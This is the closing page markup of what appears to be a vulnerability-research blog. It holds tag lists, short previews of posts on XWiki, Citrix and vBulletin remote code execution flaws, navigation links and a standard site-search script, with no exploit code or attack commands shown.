        <a class="post-tag btn btn-outline-primary" href="/tags/fortigate/">Fortigate</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ivanti/">IVanti</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/mcp/">MCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/palo-alto-networks-pan-os/">Palo-Alto-Networks-PAN-OS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/showdoc/">ShowDoc</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/simplehelp/">SimpleHelp</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/CVE-2024-21650/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1704857580"
  data-df="ll"
  
>
  Jan 10, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-21650 XWiki RCE</h4>
              <div class="text-muted">
                <p>Overview

XWiki is a Java-based, highly customizable and extensible enterprise-level Wiki platform, offering cross-database support, a powerful plugin system, a flexible template engine, and compre...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/cve-2019-19781-citrix-rce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1578627180"
  data-df="ll"
  
>
  Jan 10, 2020
</time>

              <h4 class="pt-0 my-2">CVE-2019-19781 Citrix Application DC & Citrix Gateway RCE</h4>
              <div class="text-muted">
                <p>Analysis

Two steps:

  Use path traversal request newbm.pl to write to xml file (1sh HTTP request).
  Template toolkit load and parse the xml file(2nd Request).


Path Traversal

In the published ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/vBulletin5-rce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1570505580"
  data-df="ll"
  
>
  Oct  8, 2019
</time>

              <h4 class="pt-0 my-2">vBulletin5 RCE</h4>
              <div class="text-muted">
                <p>Preface

RCE漏洞PoC被公开，该漏洞利用简单，可以直接在受害者服务中执行php代码。影响Vbulletin5.0.0至5.5.4版本，国外使用的较多。

PoC如下：

#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/version/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Practicing Version Recognition Technology in Critical Devices</p>
    </a>
  

  
    <a
      href="/posts/CVE-2025-55182/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>CVE-2025-55182 React Server Components 反序列化漏洞原理深度分析</p>
    </a>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/Mortyjin">Mortyjin</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98/">空间测绘</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fortigate/">Fortigate</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ivanti/">IVanti</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/mcp/">MCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/palo-alto-networks-pan-os/">Palo-Alto-Networks-PAN-OS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/showdoc/">ShowDoc</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/simplehelp/">SimpleHelp</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

